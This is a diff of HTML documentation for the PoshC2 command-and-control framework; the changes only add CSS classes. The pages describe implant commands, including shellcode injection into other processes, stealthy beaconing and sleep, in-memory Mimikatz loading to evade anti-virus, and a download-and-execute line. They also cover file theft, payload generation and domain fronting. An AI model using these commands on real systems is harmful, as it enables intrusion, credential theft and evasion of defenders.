@@ -206,38 +206,38 @@
 <h1>Core Implant / Features<a class="headerlink" href="#core-implant-features" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="using-an-implant">
 <h2>Using an Implant<a class="headerlink" href="#using-an-implant" title="Permalink to this headline">¶</a></h2>
-<p>The Implant-Handler window will not refresh the implant check-in times automatically, however, if you hit the [enter] key without any values in the input field it will refresh the implant window and update the last checked in times/dates. If you then wish to use one of the implants type the ID value and hit enter and this will put you into a prompt like follows <code class="docutils literal"><span class="pre">1</span></code>:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="mi">1</span><span class="o">&gt;</span>
+<p>The Implant-Handler window will not refresh the implant check-in times automatically, however, if you hit the [enter] key without any values in the input field it will refresh the implant window and update the last checked in times/dates. If you then wish to use one of the implants type the ID value and hit enter and this will put you into a prompt like follows <code class="docutils literal notranslate"><span class="pre">1</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="mi">1</span><span class="o">&gt;</span>
 </pre></div>
 </div>
-<p>If you want to select more than one implant, you can provide a comma separated list <code class="docutils literal"><span class="pre">1,2,3,4</span></code>:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="o">&gt;</span>
+<p>If you want to select more than one implant, you can provide a comma separated list <code class="docutils literal notranslate"><span class="pre">1,2,3,4</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="o">&gt;</span>
 </pre></div>
 </div>
-<p>Finally, you can select ALL implants by typing <code class="docutils literal"><span class="pre">ALL</span></code>:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">ALL</span><span class="o">&gt;</span>
+<p>Finally, you can select ALL implants by typing <code class="docutils literal notranslate"><span class="pre">ALL</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">ALL</span><span class="o">&gt;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="startanotherimplant-s">
 <h2>StartAnotherImplant / S<a class="headerlink" href="#startanotherimplant-s" title="Permalink to this headline">¶</a></h2>
-<p>Stability and redundancy is key, while we pride ourselves in the stability of PoshC2 implants it would always be in someone’s best interest to maintain access when it may have taken significant time to obtain the foothold in the first instance. Born the <code class="docutils literal"><span class="pre">StartAnotherImplant</span></code> command and does exactly what it says in the help, it provides the user with another implant for redundancy. This command is quite long and has been aliased to a shorter form so can be ran using only <code class="docutils literal"><span class="pre">S</span></code>.</p>
+<p>Stability and redundancy is key, while we pride ourselves in the stability of PoshC2 implants it would always be in someone’s best interest to maintain access when it may have taken significant time to obtain the foothold in the first instance. Born the <code class="docutils literal notranslate"><span class="pre">StartAnotherImplant</span></code> command and does exactly what it says in the help, it provides the user with another implant for redundancy. This command is quite long and has been aliased to a shorter form so can be ran using only <code class="docutils literal notranslate"><span class="pre">S</span></code>.</p>
 <p>This will by default start another “Powershell.exe” process, however, if you have migrated it will warn you before starting another implant as you may be trying to avoid using “Powershell.exe” at all because of monitoring systems checking for this execution.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">StartAnotherImplant</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">StartAnotherImplant</span>
 </pre></div>
 </div>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">S</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">S</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="migrate">
 <h2>Migrate<a class="headerlink" href="#migrate" title="Permalink to this headline">¶</a></h2>
-<p>If you want to migrate away from “Powershell.exe” to another process to main more stealth, run the <code class="docutils literal"><span class="pre">migrate</span></code> command. This will by default start a process of <code class="docutils literal"><span class="pre">netsh.exe</span></code> and inject the current implants shellcode automatically using the CreateRemoteThread call. If this fails, it will attempt to migrate using the RtlCreateUserThread WinAPI call.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Migrate</span>
+<p>If you want to migrate away from “Powershell.exe” to another process to main more stealth, run the <code class="docutils literal notranslate"><span class="pre">migrate</span></code> command. This will by default start a process of <code class="docutils literal notranslate"><span class="pre">netsh.exe</span></code> and inject the current implants shellcode automatically using the CreateRemoteThread call. If this fails, it will attempt to migrate using the RtlCreateUserThread WinAPI call.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Migrate</span>
 </pre></div>
 </div>
-<p>Alternatively, if you want to inject separate shellcode, or different architecture you can do this with the following commands. Its worth noting that at present you can go from x64 -&gt; x86 architecture but not back the other way. The only way to do this at present would be to call <code class="docutils literal"><span class="pre">rundll32.exe</span> <span class="pre">Posh_x64.dll,VoidFunc</span></code> with the x64 bit DLL dropped to disk:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Migrate</span> <span class="o">-</span><span class="n">x64</span> <span class="o">-</span><span class="n">ProcID</span> <span class="mi">444</span>
+<p>Alternatively, if you want to inject separate shellcode, or different architecture you can do this with the following commands. Its worth noting that at present you can go from x64 -&gt; x86 architecture but not back the other way. The only way to do this at present would be to call <code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">Posh_x64.dll,VoidFunc</span></code> with the x64 bit DLL dropped to disk:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Migrate</span> <span class="o">-</span><span class="n">x64</span> <span class="o">-</span><span class="n">ProcID</span> <span class="mi">444</span>
 <span class="n">Migrate</span> <span class="o">-</span><span class="n">x64</span> <span class="o">-</span><span class="n">ProcessPath</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span>\<span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
 <span class="n">Migrate</span> <span class="o">-</span><span class="n">x86</span>
 <span class="n">Migrate</span><span class="o">-</span><span class="n">x64</span> <span class="o">-</span><span class="n">ProcID</span> <span class="mi">4444</span>
@@ -252,93 +252,93 @@
 </div>
 <div class="section" id="inject-shellcode">
 <h2>Inject-Shellcode<a class="headerlink" href="#inject-shellcode" title="Permalink to this headline">¶</a></h2>
-<p>This is also a key module but can be run from the core implant and can be supplied with a file containing shellcode. This is the underlining module that is called from the migrate command above, but instead if you run the <code class="docutils literal"><span class="pre">-file</span></code> parameter it will popup an explorer window for you to provide custom shellcode to the implant.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Inject</span><span class="o">-</span><span class="n">Shellcode</span> <span class="o">-</span><span class="n">File</span>
+<p>This is also a key module but can be run from the core implant and can be supplied with a file containing shellcode. This is the underlining module that is called from the migrate command above, but instead if you run the <code class="docutils literal notranslate"><span class="pre">-file</span></code> parameter it will pop-up an explorer window for you to provide custom shellcode to the implant.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Inject</span><span class="o">-</span><span class="n">Shellcode</span> <span class="o">-</span><span class="n">File</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="beacon-seconds-minutes-hours">
 <h2>Beacon [seconds/minutes/hours]<a class="headerlink" href="#beacon-seconds-minutes-hours" title="Permalink to this headline">¶</a></h2>
-<p>This is a simple command, but has a very significant place in Posh C2. It provides the user with the ability to change the ‘beacon’ time of the implant. Beacon time is the amount of time between each call home to the C2 server. The command can take parameters in seconds (<code class="docutils literal"><span class="pre">s</span></code>), minutes (<code class="docutils literal"><span class="pre">m</span></code>) or hours (<code class="docutils literal"><span class="pre">h</span></code>).</p>
+<p>This is a simple command, but has a very significant place in Posh C2. It provides the user with the ability to change the ‘beacon’ time of the implant. Beacon time is the amount of time between each call home to the C2 server. The command can take parameters in seconds (<code class="docutils literal notranslate"><span class="pre">s</span></code>), minutes (<code class="docutils literal notranslate"><span class="pre">m</span></code>) or hours (<code class="docutils literal notranslate"><span class="pre">h</span></code>).</p>
 <p>Setting the beacon time allows the user to achieve a certain amount of ‘stealth’, for instance to bypass or disguise the traffic against various C2 monitoring solutions. In addition to the user setting, there is a 10% jitter applied, this creates a random +/- time so the call back is never exactly the same each beacon.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Beacon</span> <span class="mi">60</span><span class="n">s</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Beacon</span> <span class="mi">60</span><span class="n">s</span>
 </pre></div>
 </div>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Beacon</span> <span class="mi">10</span><span class="n">m</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Beacon</span> <span class="mi">10</span><span class="n">m</span>
 </pre></div>
 </div>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Beacon</span> <span class="mi">2</span><span class="n">h</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Beacon</span> <span class="mi">2</span><span class="n">h</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="turtle-seconds-minutes-hours">
 <h2>Turtle [seconds/minutes/hours]<a class="headerlink" href="#turtle-seconds-minutes-hours" title="Permalink to this headline">¶</a></h2>
 <p>Turtle is a similar function to the Beacon command, however in this case it tells the implant to go to sleep for a period of time, or as we like to refer to it as ‘turtle mode’.</p>
-<p>This allows the user to be even more stealthy, for example a user may want the implant to stop calling home for a long period of time, maybe overnight or for 12 hours. The command can take parameters in seconds (<code class="docutils literal"><span class="pre">s</span></code>), minutes (<code class="docutils literal"><span class="pre">m</span></code>) or hours (<code class="docutils literal"><span class="pre">h</span></code>).</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Turtle</span> <span class="mi">30</span><span class="n">m</span>
+<p>This allows the user to be even more stealthy, for example a user may want the implant to stop calling home for a long period of time, maybe overnight or for 12 hours. The command can take parameters in seconds (<code class="docutils literal notranslate"><span class="pre">s</span></code>), minutes (<code class="docutils literal notranslate"><span class="pre">m</span></code>) or hours (<code class="docutils literal notranslate"><span class="pre">h</span></code>).</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Turtle</span> <span class="mi">30</span><span class="n">m</span>
 </pre></div>
 </div>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Turtle</span> <span class="mi">12</span><span class="n">h</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Turtle</span> <span class="mi">12</span><span class="n">h</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="kill-implant">
 <h2>Kill-Implant<a class="headerlink" href="#kill-implant" title="Permalink to this headline">¶</a></h2>
 <p>This is a straight forward command to tell the implant to die and no longer connect back to the Posh C2 server. This command needs to be issued when interacting with the implant, it will not kill an implant otherwise. It is worth noting that in Powershell it will by default terminate the process, however, when migrating to another process it will only stop execution as we do not want to stop the entire PID.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Kill</span><span class="o">-</span><span class="n">Implant</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Kill</span><span class="o">-</span><span class="n">Implant</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="hide-implant">
 <h2>Hide-Implant<a class="headerlink" href="#hide-implant" title="Permalink to this headline">¶</a></h2>
-<p>The <code class="docutils literal"><span class="pre">Hide-Implant</span></code> command is a partner to the above, Kill-Implant command. The reason for this command is the situation may arise where an implant may become disconnected or stale and there is no way to interact with it or to kill it. This command simply removes it from the list of implants to avoid possible confusion.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Hide</span><span class="o">-</span><span class="n">Implant</span>
+<p>The <code class="docutils literal notranslate"><span class="pre">Hide-Implant</span></code> command is a partner to the above, Kill-Implant command. The reason for this command is the situation may arise where an implant may become disconnected or stale and there is no way to interact with it or to kill it. This command simply removes it from the list of implants to avoid possible confusion.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Hide</span><span class="o">-</span><span class="n">Implant</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="unhide-implant">
 <h2>Unhide-Implant<a class="headerlink" href="#unhide-implant" title="Permalink to this headline">¶</a></h2>
 <p>This does the reverse of the Hide-Implant, it re-adds any hidden implants into the active implant list.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Unhide</span><span class="o">-</span><span class="n">Implant</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Unhide</span><span class="o">-</span><span class="n">Implant</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="listmodules">
 <h2>ListModules<a class="headerlink" href="#listmodules" title="Permalink to this headline">¶</a></h2>
-<p>The <code class="docutils literal"><span class="pre">ListModules</span></code> command allows the user to view the Powershell modules that reside in the modules folder, within the PoshC2 folder tree. We have provided quiet a few Powershell modules that most of you will recognise such as Mimikatz and PowerUp, and some you will not have seen before. One of the nice features of PoshC2 is the ability for the user to create their own Powershell modules and use them within PoshC2. Simply copy the modules you want into the modules folder and you’ll be able to load them into a running implant with the ‘LoadModule’ command, which is discussed further in this documentation.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">ListModules</span>
+<p>The <code class="docutils literal notranslate"><span class="pre">ListModules</span></code> command allows the user to view the Powershell modules that reside in the modules folder, within the PoshC2 folder tree. We have provided quiet a few Powershell modules that most of you will recognise such as Mimikatz and PowerUp, and some you will not have seen before. One of the nice features of PoshC2 is the ability for the user to create their own Powershell modules and use them within PoshC2. Simply copy the modules you want into the modules folder and you’ll be able to load them into a running implant with the ‘LoadModule’ command, which is discussed further in this documentation.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">ListModules</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="loadmodule">
 <h2>LoadModule<a class="headerlink" href="#loadmodule" title="Permalink to this headline">¶</a></h2>
 <p>As mentioned above, the LoadModules command allows a user to upload any PowerShell module into the memory space of the current implant, nothing touches disk, so we can evade non memory resident Anti-Virus. This will either search locally in the PoshC2 modules directory or can take a full path to a directory on the hard drive if this is outside the PoshC2 core modules folder.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">LoadModule</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="o">.</span><span class="n">ps1</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">LoadModule</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="o">.</span><span class="n">ps1</span>
 </pre></div>
 </div>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">LoadModule</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">PS</span><span class="o">-</span><span class="n">Modules</span>\<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="o">.</span><span class="n">ps1</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">LoadModule</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">PS</span><span class="o">-</span><span class="n">Modules</span>\<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="o">.</span><span class="n">ps1</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="loaded-module-externally">
 <h2>Loaded Module Externally<a class="headerlink" href="#loaded-module-externally" title="Permalink to this headline">¶</a></h2>
 <p>To load a module directly from a webpage or github, you can use the Invoke-Expression function in Powershell to load this directly into memory if required.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Expression</span> <span class="p">(</span><span class="n">Get</span><span class="o">-</span><span class="n">Webclient</span><span class="p">)</span><span class="o">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s2">&quot;https://module.ps1&quot;</span><span class="p">)</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Expression</span> <span class="p">(</span><span class="n">Get</span><span class="o">-</span><span class="n">Webclient</span><span class="p">)</span><span class="o">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s2">&quot;https://module.ps1&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="modulesloaded">
 <h2>ModulesLoaded<a class="headerlink" href="#modulesloaded" title="Permalink to this headline">¶</a></h2>
-<p>The <code class="docutils literal"><span class="pre">ModulesLoaded</span></code> command shows the user which Powershell modules has been loaded into the currently active implant, this is purely an informational command to see if you have loaded something previously.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">ModulesLoaded</span>
+<p>The <code class="docutils literal notranslate"><span class="pre">ModulesLoaded</span></code> command shows the user which Powershell modules has been loaded into the currently active implant, this is purely an informational command to see if you have loaded something previously.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">ModulesLoaded</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="createproxypayload">
 <h2>CreateProxyPayload<a class="headerlink" href="#createproxypayload" title="Permalink to this headline">¶</a></h2>
-<p>The <code class="docutils literal"><span class="pre">CreateProxyPayload</span></code> command was created to allow an implant to traverse an authenticated proxy when the implant is running under the SYSTEM account. Under normal circumstances the SYSTEM account shouldn’t be authenticated on a domain level proxy server and pass through, so we created the CreateProxyPayload command to allow the attacker to provide a set of valid proxy credentials within the proxyurl and thus allows an implant to traverse any authenticated proxy server. We would use this technique when attempting lateral movement as well as privilege escalation techniques.</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">CreateProxyPayload</span></code> command was created to allow an implant to traverse an authenticated proxy when the implant is running under the SYSTEM account. Under normal circumstances the SYSTEM account shouldn’t be authenticated on a domain level proxy server and pass through, so we created the CreateProxyPayload command to allow the attacker to provide a set of valid proxy credentials within the proxyurl and thus allows an implant to traverse any authenticated proxy server. We would use this technique when attempting lateral movement as well as privilege escalation techniques.</p>
 <p>By default, this will create a new Bat file, standalone executable, service executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">CreateProxyPayload</span> <span class="o">-</span><span class="n">user</span> <span class="o">&lt;</span><span class="n">dom</span>\<span class="n">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">pass</span> <span class="o">&lt;</span><span class="k">pass</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">proxyurl</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span><span class="o">&gt;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">CreateProxyPayload</span> <span class="o">-</span><span class="n">user</span> <span class="o">&lt;</span><span class="n">dom</span>\<span class="n">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="k">pass</span> <span class="o">&lt;</span><span class="k">pass</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">proxyurl</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span><span class="o">&gt;</span>
 </pre></div>
 </div>
 <p><strong>Parameters:</strong></p>
@@ -353,9 +353,9 @@
 </div>
 <div class="section" id="createnewpayload">
 <h2>CreateNewPayload<a class="headerlink" href="#createnewpayload" title="Permalink to this headline">¶</a></h2>
-<p>This <code class="docutils literal"><span class="pre">CreateNewPayload</span></code> payload generates a number of new payloads that are setup to beacon to a different location. This is for when you are trying to remove attribution on various assets and you want some beaconing to different locations but to end up at the same PoshC2 instance. You would need to configure your C2 proxy servers to all come back to the same host.</p>
+<p>This <code class="docutils literal notranslate"><span class="pre">CreateNewPayload</span></code> payload generates a number of new payloads that are setup to beacon to a different location. This is for when you are trying to remove attribution on various assets and you want some beaconing to different locations but to end up at the same PoshC2 instance. You would need to configure your C2 proxy servers to all come back to the same host.</p>
 <p>By default, this will create a new Bat file, standalone executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">CreateNewPayload</span> <span class="o">-</span><span class="n">hostname</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hostname</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">domainfrontheader</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">CreateNewPayload</span> <span class="o">-</span><span class="n">hostname</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hostname</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">domainfrontheader</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>
 </pre></div>
 </div>
 <p><strong>Parameters:</strong></p>
@@ -371,7 +371,7 @@
 <h2>Invoke-DaisyChain<a class="headerlink" href="#invoke-daisychain" title="Permalink to this headline">¶</a></h2>
 <p>The technique “Daisy Chaining” has been explained fully under the “Lateral Movement” section, however, if you want to setup the Daisy server you can with this command. This will create a new runspace in the current implant and run a Powershell proxy server that will redirect and PoshC2 traffic that comes onto that host. It is locked down to only accept connections from other PoshC2 URLs. In theory, there is no limit to how many layers you can pivot with this option. The “localhost” switch has been incorporated for if you want to only open this up on the localhost interface and use for escalation of privileges rather than using the CreateProxyPayload option.</p>
 <p>By default, this will create a new Bat file, standalone executable, 64bit DLL, 32bit DLL and Shellcode. The user and password parameters are optional and can be blank if needed.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">DaisyChain</span> <span class="o">-</span><span class="n">name</span> <span class="n">dc1daisy</span> <span class="o">-</span><span class="n">daisyserver</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="n">port</span> <span class="mi">80</span> <span class="o">-</span><span class="n">c2port</span> <span class="mi">80</span> <span class="o">-</span><span class="n">c2server</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">c2</span><span class="o">.</span><span class="n">goog</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">domfront</span> <span class="n">aaa</span><span class="o">.</span><span class="n">clou</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">proxyurl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span> <span class="o">-</span><span class="n">proxyuser</span> <span class="n">dom</span>\<span class="n">test</span> <span class="o">-</span><span class="n">proxypassword</span> <span class="k">pass</span> <span class="o">-</span><span class="n">localhost</span> <span class="p">(</span><span class="n">optional</span> <span class="k">if</span> <span class="n">low</span> <span class="n">level</span> <span class="n">user</span><span class="p">)</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">DaisyChain</span> <span class="o">-</span><span class="n">name</span> <span class="n">dc1daisy</span> <span class="o">-</span><span class="n">daisyserver</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="n">port</span> <span class="mi">80</span> <span class="o">-</span><span class="n">c2port</span> <span class="mi">80</span> <span class="o">-</span><span class="n">c2server</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">c2</span><span class="o">.</span><span class="n">goog</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">domfront</span> <span class="n">aaa</span><span class="o">.</span><span class="n">clou</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">proxyurl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span> <span class="o">-</span><span class="n">proxyuser</span> <span class="n">dom</span>\<span class="n">test</span> <span class="o">-</span><span class="n">proxypassword</span> <span class="k">pass</span> <span class="o">-</span><span class="n">localhost</span> <span class="p">(</span><span class="n">optional</span> <span class="k">if</span> <span class="n">low</span> <span class="n">level</span> <span class="n">user</span><span class="p">)</span>
 </pre></div>
 </div>
 <p><strong>Parameters:</strong></p>
@@ -393,36 +393,36 @@
 <iframe width="480" height="270" src="https://www.youtube.com/embed/QzXnM7Vefzc?feature=oembed" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div>
 <div class="section" id="get-proxy">
 <h2>Get-Proxy<a class="headerlink" href="#get-proxy" title="Permalink to this headline">¶</a></h2>
-<p>Here we provide a command that simply reports the IP address (if any) of the proxy server that the host implant is running on. This command gets the value from the user registry hive, <code class="docutils literal"><span class="pre">HKCU\Software\Microsoft\Windows\CurrentVersion\Internet</span> <span class="pre">Settings</span></code></p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Proxy</span>
+<p>Here we provide a command that simply reports the IP address (if any) of the proxy server that the host implant is running on. This command gets the value from the user registry hive, <code class="docutils literal notranslate"><span class="pre">HKCU\Software\Microsoft\Windows\CurrentVersion\Internet</span> <span class="pre">Settings</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Proxy</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="unzip">
 <h2>Unzip<a class="headerlink" href="#unzip" title="Permalink to this headline">¶</a></h2>
 <p>Fairly straight forward command, it provides the user the ability to ‘unzip a file’, given the source and destination.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Unzip</span> <span class="n">c</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">zipped</span><span class="o">-</span><span class="n">exploit</span><span class="o">.</span><span class="n">zip</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">Exploit</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Unzip</span> <span class="n">c</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">zipped</span><span class="o">-</span><span class="n">exploit</span><span class="o">.</span><span class="n">zip</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">Exploit</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="download-file">
 <h2>Download-File<a class="headerlink" href="#download-file" title="Permalink to this headline">¶</a></h2>
 <p>Simply enter the path and name of the file to download, (copy back to the attackers system).</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Download</span><span class="o">-</span><span class="n">File</span> <span class="s1">&#39;C:\Temp\Run Me.exe&#39;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Download</span><span class="o">-</span><span class="n">File</span> <span class="s1">&#39;C:\Temp\Run Me.exe&#39;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="download-files">
 <h2>Download-Files<a class="headerlink" href="#download-files" title="Permalink to this headline">¶</a></h2>
 <p>Simply enter the path of the folder to download, this will iteratively recurse through the files/folders and download each file individually. The files will end up in the downloads folder in the same folder structure as you downloaded them.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Download</span><span class="o">-</span><span class="n">Files</span> <span class="s1">&#39;C:\Temp</span><span class="se">\&#39;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Download</span><span class="o">-</span><span class="n">Files</span> <span class="s1">&#39;C:\Temp</span><span class="se">\&#39;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="upload-file">
 <h2>Upload-File<a class="headerlink" href="#upload-file" title="Permalink to this headline">¶</a></h2>
 <p>Opposite of the above command</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Upload</span><span class="o">-</span><span class="n">File</span> <span class="o">-</span><span class="n">Source</span> <span class="s1">&#39;C:\Temp\Run.exe&#39;</span> <span class="o">-</span><span class="n">Destination</span> <span class="s1">&#39;C:\Temp\Test.exe&#39;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Upload</span><span class="o">-</span><span class="n">File</span> <span class="o">-</span><span class="n">Source</span> <span class="s1">&#39;C:\Temp\Run.exe&#39;</span> <span class="o">-</span><span class="n">Destination</span> <span class="s1">&#39;C:\Temp\Test.exe&#39;</span>
 </pre></div>
 </div>
 <p>This is not considered the be Opsec safe for obvious reasons.</p>
@@ -430,126 +430,126 @@
 <div class="section" id="web-upload-file">
 <h2>Web-Upload-File<a class="headerlink" href="#web-upload-file" title="Permalink to this headline">¶</a></h2>
 <p>Here we have the option to upload a file to a victim system but this time we allow for the file to be copied from a remote web server. Again this command is not considered Opsec safe.</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">Web</span><span class="o">-</span><span class="n">Upload</span><span class="o">-</span><span class="n">File</span> <span class="o">-</span><span class="n">From</span> <span class="s1">&#39;http://www.example.com/App.exe&#39;</span> <span class="o">-</span><span class="n">To</span> <span class="s1">&#39;C:\Temp\App.exe&#39;</span>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">Web</span><span class="o">-</span><span class="n">Upload</span><span class="o">-</span><span class="n">File</span> <span class="o">-</span><span class="n">From</span> <span class="s1">&#39;http://www.example.com/App.exe&#39;</span> <span class="o">-</span><span class="n">To</span> <span class="s1">&#39;C:\Temp\App.exe&#39;</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="get-pid">
 <h2>Get-Pid<a class="headerlink" href="#get-pid" title="Permalink to this headline">¶</a></h2>
